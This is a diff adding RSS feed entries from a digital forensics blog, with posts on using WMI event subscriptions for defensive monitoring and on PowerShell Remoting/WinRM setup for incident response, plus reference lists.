+&lt;p&gt;5) Green, Matthew. &lt;a href=&quot;https://www.linkedin.com/pulse/powershell-remoting-incident-response-matthew-green/&quot;&gt;Powershell Remoting and Incident Response (WinRM lab setup)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;6) Invoke-LiveResponse &lt;a href=&quot;https://github.com/mgreen27/Powershell-IR&quot;&gt;https://github.com/mgreen27/Powershell-IR&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;7) Sayer, Matthew. &lt;a href=&quot;http://www.hecfblog.com/2017/05/contents-in-sparse-mirror-may-be.html&quot;&gt;Contents in sparse mirror may be smaller than they appear&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 14 Jan 2018 00:00:00 +1100</pubDate>
+        <link>https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html</guid>
+        
+        <category>DFIR</category>
+        
+        <category>Powershell</category>
+        
+        <category>LiveResponse</category>
+        
+        <category>IR</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
+    
+      <item>
+        <title>Blue Team Hacks - WMI Eventing</title>
+        <description>&lt;p&gt;In this post I am going to cover a little Windows Management Instrumentation (WMI), and in particular an interesting use case for potential use in older environments with Process Monitoring gaps. Thinking about this gap led to me looking at WMI starting as an alternate near real time detection fix, and during feature investigation ended with another technically novel solution I thought was interesting enough to share.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-problem&quot;&gt;The problem&lt;/h1&gt;
+&lt;p&gt;I recently worked an engagement where our Process Monitoring tool of choice utilised Microsoft Sysmon. Unfortunately Sysmon only supports Windows 2008R2 and above, presenting with an interesting visibility gap for older machines. The first question was, how can I provide some advanced capability without needing to install another agent?&lt;/p&gt;
+
+&lt;p&gt;Another interesting question is what if as a defender I would like to run an automated action directly on the endpoint if certain conditions exist? A use case of file recovery to mitigate a potential threat actor over a short timeframe dropping a few files, running the tools and collecting output, then removing artefacts from disk with little chance of deleted file recovery. In this instance developing a solution that could also enable an alert, then copy, of files soon after they hit a staging folder could increase recoverability.&lt;/p&gt;
+
+&lt;h1 id=&quot;so-what-is-wmi&quot;&gt;So what is WMI?&lt;/h1&gt;
+&lt;p&gt;Windows Management Instrumentation is a framework used to manage Windows Systems and has been an important part of all Windows operating systems since Windows Millennium Edition. The WMI schema is Microsoft’s implementation of the Common Information Model (CIM) and Web-Based Enterprise Management (WBEM) standards by the Distributed Management Taskforce. The purpose of WMI is to enable a standardisation in the way environment classes are modelled, representing the environment data that can be accessed in a common way.&lt;/p&gt;
+
+&lt;p&gt;In layman terms, WMI both describes and is part of the “guts” of Windows internals. WMI can collect informative things like current state, or performance statistics but also capability to query, configure and take actions. WMI is often invoked through various scripting languages like PowerShell or VBScript, with both IT Operations and Offensive types using various WMI capabilities for many years. Some of the more interesting offensive use cases are persistence, reconnoissance, lateral movement, hidden storage and even command &amp;amp; control.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately WMI is minimally documented beyond MSDN and technical code references, all of which will not be covered in this post. For those interested I have included some relevant links in my references section below for further research.&lt;/p&gt;
+
+&lt;h1 id=&quot;wmi-eventing&quot;&gt;WMI Eventing&lt;/h1&gt;
+&lt;p&gt;A WMI event subscription is a method of subscribing to certain system events. WMI eventing can be used to action on almost any operating system event. For example - logon, process, registry or file activity. In my use case I am particularly interested in files being created in known staging locations on the endpoint or a particular method of lateral movement that leveraged WMI process creation. I would also require a relevant action of alert, event log generation and for the staging locations, file copy to a different folder.&lt;/p&gt;
+
+&lt;p&gt;WMI Eventing comes in two flavours, a local single process context or permanent WMI Event Subscriptions which are our focus today. These permanent subscriptions are stored in the WMI repository and persist across system shutdown / reboots. It is also worthy to note permanent WMI events run as SYSTEM level privileges.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-04-03-WMI/01WMIOverview.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are 3 components in WMI Eventing:&lt;/p&gt;
+
+&lt;h2 id=&quot;an-event-filter&quot;&gt;1. An Event Filter&lt;/h2&gt;
+&lt;p&gt;An Event Filter is a WQL query that outlines the event of interest. Think of this as the “signature” component of which are two types covering almost all conceivable operating system events.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Intrinsic events&lt;/strong&gt; are polled events that fire upon a polling interval. In research there was some concern around best practice for performance of polling intervals, in my testing I found no large performance hits however would recommend at least 30 seconds as standard, especially when deploying many Intrinsic event filters.
+In my use case I used a a WQL query that polls every 30 seconds to report on all file creations in relevant staging location. For example: C:\Windows\VSS.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__InstanceCreationEvent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WITHIN&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TargetInstance&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ISA&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&amp;quot;CIM_DataFile&amp;quot;&lt;/span&gt; 
+	&lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TargetInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Drive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&amp;quot;C:&amp;quot;&lt;/span&gt; 
+	&lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TargetInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;quot;\\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VSS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\\”&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Alternatively, &lt;strong&gt;Extrinsic events&lt;/strong&gt; are real time filters. The downside is there are not a lot of Extrinsic events available, but they should take preference over Intrinsic.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Below will alert on WMI Process Create event and trigger on some WMI based lateral movement.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MSFT_WmiProvider_ExecMethodAsyncEvent_Pre&lt;/span&gt; 
+	&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;&amp;quot;Win32_Process&amp;quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MethodName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;&amp;quot;Create&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;event-consumer&quot;&gt;2. Event Consumer&lt;/h2&gt;
+&lt;p&gt;An Event Consumer is an action to perform upon triggering an event. There are 5 possible classes.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;ActiveScriptEventConsumer&lt;/strong&gt; - Executes a script by reference or embedded in the consumer itself, support for VBScript via WSH.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CommandLineEventConsumer&lt;/strong&gt;  - Executes a specified binary or command line, preferred for PowerShell execution, potential for use with an encoded command for embedded PowerShell.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;LogFileEventConsumer&lt;/strong&gt; - Write to a specified log file.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;NTEventLogEventConsumer&lt;/strong&gt; - Logs a Message to the Application EventLog&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;SMTPEventConsumer&lt;/strong&gt; - Sends an email message using SMTP every time that an event is delivered to it.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I initially was looking at NTEventLogEventConsumer which could be the preferred option for most organisations looking for a monitoring capability. For my use case above, I ended up implementing an ActiveScriptEventConsumer that wrote to a particular log file and completed the file copy in a single Event Consumer to a friendly folder. The alerts and file copy status for each machine is managed and retrieved by a centralised dashboard, however the solution could alert, post, or write to any scriptable resource.&lt;/p&gt;
+
+&lt;h2 id=&quot;filter-to-consumer-binding&quot;&gt;3. Filter to Consumer Binding&lt;/h2&gt;
+&lt;p&gt;Filter to consumer Binding is the registration mechanism that binds a filter to a consumer.&lt;/p&gt;
+
+&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;With WMI we have a powerful but difficult to manage capability that can be used in some interesting technical use cases. The scope of capabilities being limited to understanding WMI classes and taking the time to build filters and event consumers.&lt;/p&gt;
+
+&lt;p&gt;Its worthy to note there is a proof of concept capability currently available from the research community. FLARE WMI-IDS and Invoke-IR Uproot-IDS (see references) provides a good starting point for those looking to build their own solution.&lt;/p&gt;
+
+&lt;p&gt;One of the major difficulties with WMI Eventing is troubleshooting problems with event consumers. With this in mind I found best workflow came with using some reference code to develop a simple template to assist understanding and troubleshooting efforts then expand into using the above frameworks as new functionality not incorporated is validated and understood.&lt;/p&gt;
+
+&lt;p&gt;For those interested, I have also included a reference PowerShell script on GitHub - &lt;a href=&quot;https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;HERE&lt;/a&gt; -  to help anyone looking to create a similar ActiveScriptEventConsumer described above.&lt;/p&gt;
+
+&lt;p&gt;Hopefully this post has provided some good food for thought and pointed interested parties in the direction for further research and reference material. Feel free to reach out if you have any questions.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;
+&lt;p&gt;1) Ballenthin,William. Graeber, Matt. Teodorescu Claudiu. &lt;a href=&quot;https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Windows Management Instrumentation (WMI) Offense, Defense, and Forensics&lt;/a&gt;, 2015&lt;/p&gt;
+
+&lt;p&gt;2) Distributed Management Task Force, &lt;a href=&quot;http://www.dmtf.org/standards/cim?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Common Information Model&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;3) Distributed Management Task Force, &lt;a href=&quot;http://www.dmtf.org/standards/wbem?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Web-Based Enterprise Management&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;4) Fireeye FLARE. &lt;a href=&quot;https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;WMI-IDS&lt;/a&gt;, 2015&lt;/p&gt;
+
+&lt;p&gt;5) Invoke IR. &lt;a href=&quot;https://github.com/Invoke-IR/Uproot?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Uproot&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;6) Kerr, &lt;a href=&quot;https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Devon.There’s Something About WMI&lt;/a&gt;, 2015&lt;/p&gt;
+
+&lt;p&gt;7) MSDN. &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;Windows Management Instrumentation&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;8) Parisi, Timothy. Pena, Evan. &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/08/wmi_vs_wmi_monitor.html?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;WMI vs. WMI: Monitoring for Malicious Activity&lt;/a&gt;, 2016&lt;/p&gt;
+
+&lt;p&gt;9) US Department of Homeland Security. &lt;a href=&quot;https://ics-cert.us-cert.gov/sites/default/files/documents/WMI_for_Detection_and_Response_S508C.pdf?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B9G70WaahSY2Z0vfHlD4oXg%3D%3D&quot;&gt;WMI for Detection and Response&lt;/a&gt;, 2016&lt;/p&gt;
+</description>
+        <pubDate>Mon, 03 Apr 2017 00:00:00 +1000</pubDate>
+        <link>https://mgreen27.github.io/posts/2017/04/03/Blue_Team_Hacks-WMI_Eventing.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2017/04/03/Blue_Team_Hacks-WMI_Eventing.html</guid>
+        
+        <category>DFIR</category>
+        
+        <category>Powershell</category>
+        
+        <category>WMI</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
+    
+      <item>
+        <title>PowerShell Remoting and Incident Response</title>
+        <description>&lt;p&gt;PowerShell is quickly becoming a tool of choice for many IT Operations staff and Security Practitioners alike. This post is a quick overview of using Windows Remote Management and PowerShell for Incident Response. I will also provide some proof of concept setup instructions and general themes for those interested in further research on this topic.&lt;/p&gt;
+
+&lt;h2 id=&quot;so-what-is-windows-remote-management&quot;&gt;So what is Windows Remote Management?&lt;/h2&gt;
+&lt;p&gt;PowerShell is a powerful scripting language for systems management due to its ability to run on remote systems, automation capability and ability to scale. The component enabling this capability is called the Windows Remote Management service (WinRM), which works over a standardised Simple Object Access Protocol (SOAP) based, firewall friendly protocol – WS Management. PowerShell is just one consumer of this service/protocol combo and with all Windows management communications heading down this path, this capability is only going to be further entrenched moving forward.&lt;/p&gt;
+
+&lt;p&gt;Windows Remote Management has been available since PowerShell 2.0 and Windows 7 through to the most recent incarnation in Windows Management Framework (WMF) 5.1. WinRM is enabled by default in Windows Server 2012 and 2016 but, as you’ll see below, simple to enable back to Windows 7 running PowerShell 2.0.&lt;/p&gt;
+
+&lt;h2 id=&quot;why-do-i-care&quot;&gt;Why do I care?&lt;/h2&gt;
+&lt;p&gt;There are six primary reasons why you should care about PowerShell Remoting for Incident Response:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Data available for Collection&lt;/strong&gt; - PowerShell has access to WMI, COM, .NET as well as to the Windows API. When combined with the capability to run some smart 3rd party or open source tools there really isn’t much you can’t do with PowerShell. Data collection is possible from: static disk, registry, log and configuration data; or any volatile process, network connection, or other in memory artefact. Historical data can be collected with timeline collection tools or pre-deployment of a process monitoring tool or Event Tracing for Windows.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Analysis&lt;/strong&gt; - PowerShell is an object based language making analysis fairly simple once the dataset and methods of sorting / searching are understood. There is much integration readily available for common use cases like: live response, outlier analysis, baseline comparisons or building a timeline&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Performance&lt;/strong&gt; - PowerShell Remoting can significantly improve performance when scripting collections at scale. Execution of the command occurs in parallel on each target machine reporting the results, opposed to the source machine running through commands in an iterative scripted loop.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/01performance.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Strategic&lt;/strong&gt; - Windows Remote Management is Microsoft’s strategic direction for all Windows management communications moving forward. Many operations teams are already considering or currently using WinRM so it is worthwhile to understand points of leverage and weaknesses. Interestingly, PowerShell is also now open source with both OSX and Linux versions available.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Agentless&lt;/strong&gt; - PowerShell remoting provides capability without needing to install “yet another agent”.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Cost&lt;/strong&gt; – It is hard to argue with free, especially if there are skillsets in house already taking advantage of WinRM / PowerShell remoting.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-the-catch&quot;&gt;What is the catch?&lt;/h2&gt;
+&lt;p&gt;The benefits of PowerShell remoting seem quite compelling but there are two main catches:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Operational overhead&lt;/strong&gt; - Traditional open source issues of cost to build and maintain capability rather than going down a COTS path. Most organisations are not really mature enough to fully embrace building a complete solution in this space beyond simple collections (not everyone is a well resourced Fortune 500).&lt;/p&gt;
+
+&lt;p&gt;A great example here is process monitoring solutions - i.e. collection and analysis of historical data. While open source collection via Sysmon or other tools is available and better than the status quo in most organisations (i.e. nothing), a paid solution may provide much more capability at lower overall cost. When deciding to build, buy or outsource it is important not only understanding requirements, but also workflow underpinning those requirements, as well as technology and architecture.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Security perceptions&lt;/strong&gt; - There are concerns around PowerShell security. Increased in-wild threats and popularity of offensive research in the past few years have driven this concern. Although most definitely not infallible, a properly configured PowerShell network will arguably lead to a much more secure environment than default - “properly configured” being the key word. With that in mind, similar to operational overhead, maturity may be the major driver for concerns about turning on WinRM.&lt;/p&gt;
+
+&lt;p&gt;It’s also worthy to note Microsoft has come a long way in recent editions of Windows and PowerShell from the original WinRM version included in Windows 7. Modern Windows 10 / PowerShell 5.0 versions feature comprehensive auditing capabilities for PowerShell and additional OS level security features. Features like Credential Guard, Device Guard, Applocker and AntiMalware ScanInterface (when used mainstream); combined with the Microsoft concept of “constrained endpoints” will really help reduce options for attackers.&lt;/p&gt;
+
+&lt;h1 id=&quot;so-how-do-i-start&quot;&gt;So how do I start?&lt;/h1&gt;
+&lt;p&gt;There are a few ways to setup WinRM. Group Policy, you can use a command line tool (Winrm), or PowerShell cmdlets. I have pointed at some good resources including ideas to lock down Windows Remote Management and how to configure WinRM over HTTPS in the reference section below.&lt;/p&gt;
+
+&lt;p&gt;A useful method for Lab / Proof of Concept testing is via group policy; also consider turning on PowerShell script block logging and process monitoring to list a couple of other generic recommendations. In a nutshell for a basic WinRM configuration you are required to:&lt;/p&gt;
+
+&lt;h3 id=&quot;configure-a-winrm-listener&quot;&gt;1. Configure a WinRM listener&lt;/h3&gt;
+&lt;p&gt;Note: Examples are referencing Windows 2012R2 Domain with client machines running PowerShell 2.0 (WinRM minimum requirement) through 5.0. Recommendations are to upgrade to WMF5.0 to take advantage of capabilities like PowerShell Script Block logging and additional built-in PowerShell cmdlets.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/02config1.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Administrative Templates &amp;gt; Windows Components &amp;gt; Windows Remote Management &amp;gt; WinRM Service &amp;gt; Allow Remote server management through WinRM &amp;gt; Here you are required to Enable WinRM and set service listening IP to * or IP of listening interface.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/03config2.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;configure-the-winrm-service-to-start-automatically&quot;&gt;2. Configure the WinRM service to start automatically&lt;/h3&gt;
+&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Windows Settings &amp;gt; Security Settings &amp;gt; System Services &amp;gt; Windows Remote Management (WS-Management) &amp;gt; set to automatic&lt;/p&gt;
+
+&lt;p&gt;Note: a client reboot is required to start Windows Remote Management Service automatically from Group Policy.&lt;/p&gt;
+
+&lt;h3 id=&quot;allow-winrm-traffic-through-the-firewall&quot;&gt;3. Allow WinRM traffic through the firewall&lt;/h3&gt;
+&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Windows Settings &amp;gt; Security Settings &amp;gt; Windows Firewall… &amp;gt; Windows Firewall… &amp;gt; Inbound Rule &amp;gt; Create rule using predefined Windows Remote Management (HTTP-In)&lt;/p&gt;
+
+&lt;h3 id=&quot;ensure-local-admin-privileges-on-the-target-machine&quot;&gt;4. Ensure local admin privileges on the target machine.&lt;/h3&gt;
+&lt;p&gt;Note: WinRM can be configured to NOT require local admin however some of the collections your going to want to run will likely require administrator privilege. Credential risk is minimised using the default WinRM Kerberos authentication.&lt;/p&gt;
+
+&lt;p&gt;Group Policy &amp;gt; Computer Configuration &amp;gt; Policies &amp;gt; Preferences &amp;gt; Control Panel Settings &amp;gt; Local Users and Groups &amp;gt; right click &amp;gt; All Tasks &amp;gt; Add &amp;gt; add User or Group to local administrators group.&lt;/p&gt;
+
+&lt;p&gt;Alternatively, for those looking for a PowerShell command line version: Running the command below to setup WinRM locally on your test hosts is fairly painless. Options like Enterprise Deployment Tool, Logon Script, PSEXEC or WMIC can be used for deployment as required. It is also worth noting that to configure a custom listener port you are required to use a CLI based configuration.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;#Setup: &lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Enable-PSRemoting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Force&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#Confirm WinRM is setup and responsive:&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Test-WSMan&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ComputerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;[Options]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Test-WSMan&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ComputerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Authentication&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Kerberos&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/04testnoauth.png&quot; alt=&quot; &quot; /&gt;
+&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/05testwithauth.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;authentication&quot;&gt;Authentication&lt;/h1&gt;
+&lt;p&gt;When using PowerShell Remoting you have the capability to configure authentication methods. The default and recommended when joined to a domain is PowerShell’s non-delegated Kerberos network logons. These authentication attempts result in network type 3 logons and no credential exposure. Other available options are Basic, CredSSP, Default, Digest, Kerberos, and Negotiate; Negotiate being recommended for non domain machines.&lt;/p&gt;
+
+&lt;p&gt;Note: make a point not to use CredSSP as there are credential risks associated with delegating credentials.&lt;/p&gt;
+
+&lt;p&gt;When testing in a domain to use default Kerberos authentication you do not need to specify the authentication method. There are a couple of ways to initiate a session, the simplest being a singular: “Invoke-Command” with parameters included.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/06simpleexampleNEW.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Reusable sessions can also be configured using the “New-PSSession” cmdlet then calling the open session. As seen in my animation below I can invoke a session then run several commands through the open session.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/gif01.gif&quot; alt=&quot;PS-Session&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally the “Enter-PSSession” cmdlet can be used for SSH like connectivity on the remote machine. In the animated example below I show some basic queries and filtering then query Sysmon logs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/gif02.gif&quot; alt=&quot;PS-Session Sysmon&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In my test environment I used a specifically allocated Active Directory service account for my PowerShell Remoting use, which I then allocated into a local administrator role via group policy. Similar actions could be taken with an appropriate group with local admin rights across all machines. This is much easier to control as well as audit in Security and Windows Remote Management Event logs.&lt;/p&gt;
+
+&lt;h1 id=&quot;whats-next&quot;&gt;What’s next?&lt;/h1&gt;
+&lt;p&gt;Some good areas to start to understand capabilities or implementation code reference are the following interesting frameworks and capabilities able to leverage WinRM:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1) Kansa&lt;/strong&gt; - Written by Dave Hull, Kansa is a modular incident response framework that takes advantage of PowerShell remoting to enable surprisingly simple and scalable, current state data collections from Windows machines. Kansa can facilitate incident response, an environment baseline, intrusion hunting analysis, or even remediation across thousands of machines with ease. Kansa enables fairly easy way to write additional modules and a prebuilt framework to run 3rd party binaries inside its workflow.&lt;/p&gt;
+
+&lt;p&gt;Get-Kansa: &lt;a href=&quot;https://github.com/davehull/Kansa&quot; title=&quot;Get Kansa&quot;&gt;https://github.com/davehull/Kansa&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2) PowerForensics&lt;/strong&gt; - Written by Jared Atkinson, PowerForensics is a comprehensive disk forensic framework proving raw access to disk from PowerShell. Working with PowerForensics a typical analysis would occur locally, for a local or mounted drive.&lt;/p&gt;
+
+&lt;p&gt;Jared has recently been working on a remoting solution that leverages the Assembly class’ Load method to load the PowerForensics DLL in memory. The general idea is when running a command over WinRM the local machine checks if PowerForensics is loaded, if not, the appropriate PowerForensics assembly dll is loaded in memory for the duration of the WinRM session. This capability enables remote raw drive analysis and would significantly speed up analysis times removing the need for imaging or pushing an agent.&lt;/p&gt;
+
+&lt;p&gt;Get-PowerForensics: &lt;a href=&quot;https://github.com/Invoke-IR/PowerForensics&quot; title=&quot;Get Powerforensics&quot;&gt;https://github.com/Invoke-IR/PowerForensics&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2017-01-12-PowerShell_Remoting_IR/07Powerforensics.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The Remoting capability via “Invoke-Command” is very new and still in development. Current requirement is to run “Add-PowerForensicsType” in your PS-Session although the goal is to eventually make this transparent to the user. In my testing limitations around versioning of PowerForensics appear to require ironing out so testing and tool validation are essential.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;With PowerShell Remoting over WinRM we have a flexible, yet powerful scripting language that can be used to query endpoints to collect relevant data points that an Incident Responder or Security team may require. Capable at scale, and over a communications framework included free in all modern Windows Operating systems. Although actually turning on WinRM may be difficult, it is worth some research to understand PowerShell remoting capabilities when considering future needs. A great strategy, but one used too infrequently is justifying a paid solution through showing benefits of open source capability, and comparing to relevant capability provided from a vendor.&lt;/p&gt;
+
